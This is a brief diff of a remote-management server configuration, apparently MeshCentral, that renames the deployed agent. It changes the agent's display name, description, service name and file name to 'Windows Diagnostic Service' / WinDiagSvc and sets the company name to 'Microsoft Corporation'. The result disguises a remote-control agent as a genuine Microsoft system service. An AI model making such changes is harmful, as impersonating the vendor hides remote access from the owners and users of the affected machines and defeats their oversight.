@@ -14,11 +14,11 @@
       "newAccounts": true,
       "minify": false,
       "agentcustomization": {
-        "displayname": "Windows Management System",
-        "description": "Windows Management System background service",
-        "companyname": "Windows Management System",
-        "servicename": "WinMgmtSys",
-        "filename": "WinMgmtSys"
+        "displayname": "Windows Diagnostic Service",
+        "description": "Windows Diagnostic Service host process",
+        "companyname": "Microsoft Corporation",
+        "servicename": "WinDiagSvc",
+        "filename": "WinDiagSvc"
       },
       "certUrl": "https://devicenex.tech/",
       "agentconfig": [
